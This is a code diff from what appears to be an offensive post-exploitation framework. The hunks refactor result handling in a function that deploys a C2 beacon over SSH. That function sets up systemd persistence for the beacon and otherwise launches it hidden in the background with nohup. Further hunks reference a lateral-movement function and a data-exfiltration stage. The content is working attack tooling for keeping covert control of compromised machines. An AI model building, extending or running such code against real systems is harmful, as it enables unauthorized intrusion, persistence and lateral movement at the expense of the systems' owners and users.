@@ -116,15 +116,18 @@ def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str
         if is_root:
             print(f"    {C_CYAN}[*] Establishing systemd persistence for beacon...{C_RESET}")
             try:
-                from plugins.persistence.systemd import SystemdPersistence
+                from modules.persistence.systemd import SystemdPersistence
                 plugin = SystemdPersistence()
                 res = plugin.run(target=host, ssh_client=client, payload_path=f"python3 {target_path}")
+                res_success = getattr(res, "success", False) or (isinstance(res, dict) and res.get("status") == "success")
+                res_data = getattr(res, "data", None) or (res.get("data", {}) if isinstance(res, dict) else {})
+                res_error = getattr(res, "error", "") or (res.get("error", "") if isinstance(res, dict) else "")
                 
-                if res.get("status") == "success":
-                    output += f"[+] C2 beacon persistence established via systemd ({res['data']['service']})\n"
+                if res_success:
+                    output += f"[+] C2 beacon persistence established via systemd ({res_data.get('service', 'systemd')})\n"
                     print(f"    {C_GREEN}[+] Systemd persistence established{C_RESET}")
                 else:
-                    output += f"[-] Failed to establish systemd persistence: {res.get('error')}\n"
+                    output += f"[-] Failed to establish systemd persistence: {res_error}\n"
                     _ssh_exec(client, f"nohup python3 {target_path} >/dev/null 2>&1 &", timeout=5)
                     output += "[+] Executed beacon in background (nohup)\n"
             except ImportError:
@@ -331,5 +334,4 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
 # ═══════════════════════════════════════════════
 # STAGE 6: DATA EXFILTRATION
 # ═══════════════════════════════════════════════
-
 
